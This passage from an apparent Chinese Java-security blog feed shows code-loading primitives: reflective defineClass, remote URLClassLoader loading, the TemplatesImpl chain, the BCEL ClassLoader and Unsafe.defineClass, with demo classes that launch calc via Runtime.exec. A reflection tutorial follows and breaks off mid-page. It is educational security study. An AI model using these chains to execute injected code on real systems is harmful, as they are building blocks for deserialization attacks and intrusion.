class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123; <br><span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> <br>ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <br><span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class); <br>defineClass.setAccessible(<span class="hljs-literal">true</span>); <br><span class="hljs-type">byte</span>[] code = <br>Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>); <br><span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length); <br>hello.newInstance(); <br>&#125; <br>&#125; <br></code></pre></td></tr></table></figure><h3 id="2-利用URLClassLoader"><a href="#2-利用URLClassLoader" class="headerlink" title="2.利用URLClassLoader"></a>2.利用URLClassLoader</h3><p>URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ol><li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且<strong>协议名是 file</strong> ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</p></li></ol><p>注意第三种情况，<strong>如果我们使用的是http协议，那么就会使用到Loader来寻找类，也就是说URLClassLoader允许远程加载类</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL; <br><span class="hljs-keyword">import</span> java.net.URLClassLoader; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> <br>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception <br>&#123; <br>URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;; <br><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls); <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>); <br>c.newInstance(); <br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-利用xlan"><a href="#3-利用xlan" class="headerlink" title="3.利用xlan"></a>3.利用xlan</h3><p><strong>TemplatesImpl</strong>是<code>com.sun.org.apache.xalan</code>包中一个非常有利用价值的类，它是默认包含在JDK中的。</p><p>通过调用其<code>newTransformer()</code>方法我们最终可以调用<code>defineClass()</code>，具体的细节并不复杂不再赘述，大致过程是</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> getTransletInstance<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> defineTransletClasses<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> defineClass()<br></code></pre></td></tr></table></figure><p>当然有几个属性要满足条件才能打通利用链:</p><ul><li><code>_name</code>不为空</li><li><code>_bytecodes</code>存放字节码</li><li><code>_tfactory</code>必须是TransformerFactoryImpl类</li><li>加载的类必须是AbstractTranslet的子类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Test.java</span><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        namefield.setAccessible(<span class="hljs-literal">true</span>);<br>        namefield.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//_class属性为null不赋值</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;c:\\tmp\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span> [][] codes = &#123;code&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesfield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesfield.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesfield.set(templates,codes); <span class="hljs-comment">//载入字节码</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryfield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryfield.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>        <span class="hljs-comment">//运行弹出计算器</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-利用BCELClassLoader"><a href="#4-利用BCELClassLoader" class="headerlink" title="4.利用BCELClassLoader"></a>4.利用BCELClassLoader</h3><p>注意: <strong>BCELclassloader在jdk8u251之后的版本就无法使用</strong></p><p>BCEL字节码是字节码的一种，与上文中提到的字节码在本质上并无不同，仅仅是形式上的变化。</p><ul><li>BCEL类存储在com.sun.org.apache.bcel.internal.util包中。</li><li>BECL ClassLoader也是一种恢复成一个类并在JVM虚拟机中进行加载的字节序列。</li><li>BCEL也是在JDK库中，在com.sun.org.apache.bcel.internal.util的包中有一个ClassLoader类，它是一个ClassLoader类，和默认的java.lang包下的ClassLoader类不同，loadClass实现不同而已。</li><li>欲让BCELclassloader识别加载BCEL字节码，<strong>需要在开头添加</strong><code>$$BCEL$$</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><span class="hljs-keyword">import</span> evil.Exploit;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELClassLoaderDemo</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成BCEL格式的字节码，方法一：</span><br><span class="hljs-comment">     *   通过 Repository.lookupClass()将Class对象转化为表示Java字节码的对象JavaClass</span><br><span class="hljs-comment">     *   然后通过Utility.encode() 将Java字节码对象JavaClass转化为BCEL格式的字节码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateBcelCode1</span><span class="hljs-params">(Class clazz)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">evilJavaClazz</span> <span class="hljs-operator">=</span> Repository.lookupClass(clazz);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(evilJavaClazz.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code;<br>        System.out.println(<span class="hljs-string">&quot;bcelcode=&quot;</span> + bcelCode);<br>        <span class="hljs-keyword">return</span> bcelCode;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成BCEL格式的字节码，方法二：</span><br><span class="hljs-comment">     *   将Java字节码直接传入Utility.encode() ，从而得到BCEL格式的字节码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateBcelCode2</span><span class="hljs-params">(String classBase64)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] codes = Base64.getDecoder().decode(classBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(codes, <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code;<br>        System.out.println(<span class="hljs-string">&quot;bcelcode=&quot;</span> + bcelCode);<br>        <span class="hljs-keyword">return</span> bcelCode;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">bcelClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br><span class="hljs-comment">//            String bcelCode = generateBcelCode1(Exploit.class);</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> generateBcelCode2(<span class="hljs-string">&quot;yv66v...(class字节码的base64编码)...&quot;</span>);<br>            bcelClassLoader.loadClass(bcelCode).newInstance();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Exploit.java</span><br><span class="hljs-keyword">package</span> evil;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="5-利用unsafe"><a href="#5-利用unsafe" class="headerlink" title="5.利用unsafe"></a>5.利用unsafe</h3><p><code>sun.misc.Unsafe</code>类中有<code>defineClass()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.misc.Unsafe <span class="hljs-keyword">public</span> Class&lt;?&gt; defineClass(String s,<br>                            <span class="hljs-type">byte</span>[] bytes,<br>                            <span class="hljs-type">int</span> i,<br>                            <span class="hljs-type">int</span> i1,<br>                            ClassLoader classLoader,<br>                            java.security.ProtectionDomain protectionDomain)<br></code></pre></td></tr></table></figure><p>我们可以直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">// 获取Unsafe无参构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredConstructor();<br><br><span class="hljs-comment">// 修改构造方法访问权限</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 反射创建Unsafe类实例，等价于 Unsafe unsafe = new Unsafe();</span><br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) constructor.newInstance();<br>unsafe.defineClass(&lt;className&gt;,&lt;classBytes&gt;,&lt;offset=<span class="hljs-number">0</span>&gt;,&lt;length&gt;);<br></code></pre></td></tr></table></figure><p>测试用class自行编写。</p><p>unsafe的补充: <a href="https://javasec.org/javase/Unsafe">https://javasec.org/javase/Unsafe</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>类加载</tag>
      
      <tag>双亲委派模型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Refelction</title>
    <link href="/2022/12/28/Refelction/"/>
    <url>/2022/12/28/Refelction/</url>
    
    <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种<strong>动态获取的信息</strong>以及<strong>动态调用对象的方法</strong>的功能就称为java语言的反射机制。</p><h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><p>JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息；因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><p>常用的由以下几种方式获取类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1.由静态属性class获取</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> String.class;<br><br><span class="hljs-comment">// 2.由getClass()获取</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> s.getClass();<br><br><span class="hljs-comment">// 3.Class.forName()</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br><br><span class="hljs-comment">//4.ClassLoader</span><br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;com.spring.sec.ClassLoader.reflectTest&quot;</span>);<br></code></pre></td></tr></table></figure><p>获取类之后就可以对类进行访问修改等操作，值得注意的是，上述四种方法所获取的Class实例是同一个。</p><h2 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.spring.sec.reflectTest&quot;</span>);<br><br> Field[] fields = clazz.getFields();<br><span class="hljs-comment">//获得类(包括父类)中所有的public属性。</span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;property&quot;</span>);<br><span class="hljs-comment">//获得类(包括父类)中指定的public属性。</span><br> <br> Field[] declaredFields = clazz.getDeclaredFields();<br><span class="hljs-comment">//获得某个类的所有声明的属性，包括public、private和proteced，但不包括父类的申明属性。</span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br><span class="hljs-comment">//获得某个类中的指定属性，包括public、private和proteced，但不包括父类的申明属性。</span><br></code></pre></td></tr></table></figure><p>对于获取到的属性，我们想要在具体的实例中获取需要使用<code>get()</code>方法，修改需要使用<code>set()</code>方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> field.get(clazz.newInstance());<br><span class="hljs-comment">//获取实例中的属性</span><br>field.set(clazz.newInstance(),<span class="hljs-string">&quot;edited_property&quot;</span>);<br><span class="hljs-comment">//修改实例中的属性</span><br></code></pre></td></tr></table></figure><p>另外对于<code>private</code>，<code>protected</code>修饰的属性需要先设置可编辑才能修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">privateField.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置可修改</span><br></code></pre></td></tr></table></figure><h2 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h2><p><code>getMehtod()</code> 其原型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> reflect.Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(<span class="hljs-meta">@NonNls</span> <span class="hljs-meta">@NotNull</span> String name,</span><br><span class="hljs-params">                Class&lt;?&gt;... parameterTypes)</span><br></code></pre></td></tr></table></figure><p>一些例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.spring.sec.reflectTest&quot;</span>);<br><br>Method[] methods = clazz.getMethods();<br><span class="hljs-comment">//获取所有public的Method（包括父类）</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//获取某个public的Method（包括父类）</span><br><br>Method[] methods = clazz.getDeclaredMethods();<br><span class="hljs-comment">//获取类中所有的Methods（不包括父类）</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//获取类中的某个Method（不包括父类）</span><br><br><span class="hljs-comment">//若要指定方法重载，可以添加参数parameterTypes</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;name&quot;</span>,String.class); <br><span class="hljs-comment">//获取参数列表为&lt;String&gt;的方法，识别重载</span><br><br></code></pre></td></tr></table></figure><h3 id="调用-invoke"><a href="#调用-invoke" class="headerlink" title="调用: invoke()"></a>调用: invoke()</h3><p>获取方法后执行需要调用<code>invoke()</code>，其原型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object obj, Object... args)</span><br></code></pre></td></tr></table></figure><p><code>obj</code>是实例，<code>args</code>是参数例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">method.invoke(clazz,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;springtime&quot;</span>));<br><br><span class="hljs-comment">//无参方法第二个参数为空</span><br>method.invoke(clazz);<br></code></pre></td></tr></table></figure><p>注意：<strong>若调用的方法为静态方法，则第一个参数必须是</strong><code>null</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取Integer.parseInt(String)方法，参数为String:</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Integer.class.getMethod(<span class="hljs-string">&quot;parseInt&quot;</span>, String.class);<br><span class="hljs-comment">// 调用该静态方法并获取结果:</span><br><span class="hljs-type">Integer</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> (Integer) m.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;23333&quot;</span>);<br>System.out.println(n);<br></code></pre></td></tr></table></figure><h2 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt; constructor = clazz.getConstructor();<br><span class="hljs-comment">//获取某个public的无参Constructor</span><br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor()<br><span class="hljs-comment">//获取某个无参Constructor</span><br><br>Constructor&lt;?&gt; constructor = clazz.getConstructor(...parameterTypes)<br><span class="hljs-comment">//获取某个public的指定参数的constructor</span><br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(...parameterTypes)<br><span class="hljs-comment">//获取某个指定参数的constructor</span><br><br>Constructor&lt;?&gt;[] constructors = clazz.getConstructors();<br><span class="hljs-comment">//获取所有public的Constructor</span><br>Constructor&lt;?&gt;[] Constructors = clazz.getDeclaredConstructors();<br><span class="hljs-comment">//获取所有Constructor</span><br></code></pre></td></tr></table></figure><h3 id="实例化-newInstance"><a href="#实例化-newInstance" class="headerlink" 